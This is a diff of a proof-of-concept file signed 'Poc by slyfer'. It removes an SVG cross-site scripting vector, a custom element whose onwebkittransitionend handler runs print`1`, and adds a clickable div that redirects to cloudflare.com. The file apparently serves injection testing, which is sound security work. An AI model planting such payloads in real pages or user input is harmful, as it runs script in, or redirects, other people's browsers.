@@ -1,8 +1,19 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-  <foreignObject>
+<div onclick="window.location='https://cloudflare.com'" style="cursor: pointer;">
+  <svg xmlns="http://www.w3.org/2000/svg" height="100" width="300">
+    <rect fill="white" height="100" id="bg" width="300"/>
+    <text dominant-baseline="middle" fill="black" font-family="Arial" font-size="24" id="text" text-anchor="middle" x="50%" y="50%">
+      Poc by slyfer
+    </text>
+    <style>
+      /* Hover effect for the background */
+      svg:hover #bg {
+        fill: black;
+      }
 
-<svg width="200" height="200">
-<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=print`1`></xss>
-  </foreignObject>
-</svg>
+      /* Hover effect for the text */
+      svg:hover #text {
+        fill: white;
+      }
+    </style>
+  </svg>
+</div>
